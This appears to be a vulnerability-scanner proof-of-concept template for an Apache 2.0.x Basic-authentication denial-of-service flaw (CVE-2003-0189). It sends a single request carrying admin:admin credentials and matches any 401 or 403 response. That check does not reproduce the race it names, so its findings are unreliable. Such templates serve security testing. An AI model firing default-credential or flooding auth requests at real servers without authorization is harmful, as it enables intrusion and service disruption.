[info]
author = "ave"
description = "Apache HTTP Server 2.0.40-2.0.45 使用 threaded MPM 时，crypt_r 函数存在条件竞争，发送大量并发基础认证请求可触发合法认证失败导致拒绝服务。"
id = "POC-AVE-2003-0058"
name = "Apache HTTP Server 认证模块拒绝服务漏洞 PoC"
severity = "medium"
tags = ["ave-2003-0058"]
vuln_id = [
    "CVE-2003-0189",
    "AVE-2003-0058",
]

[poc]
logic = "any"

[[poc.requests]]
method = "GET"
path = "/{{BaseURL}}/auth-required"
protocol = "http"

[poc.requests.headers]
Authorization = "Basic YWRtaW46YWRtaW4="

[[poc.requests.matchers]]
expect = true
status = [
    401,
    403,
]
type = "status"
